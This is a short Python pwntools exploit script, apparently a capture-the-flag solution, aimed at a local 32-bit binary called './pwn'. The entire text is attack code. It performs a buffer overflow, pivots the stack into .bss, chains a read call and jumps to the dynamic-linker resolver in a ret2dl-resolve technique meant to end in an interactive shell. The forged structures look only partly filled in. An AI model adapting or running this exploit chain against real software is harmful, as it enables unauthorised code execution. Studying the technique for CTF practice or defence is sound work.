from pwn import *

context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x80490d5
start_resolve = 0x8049020
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr

payload = b'a' * 0x108 + p32(base_addr - 4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
p.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 -rel_plt) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200) + p32(0x804C004) + p32(0x207)
p.send(payload)

p.interactive()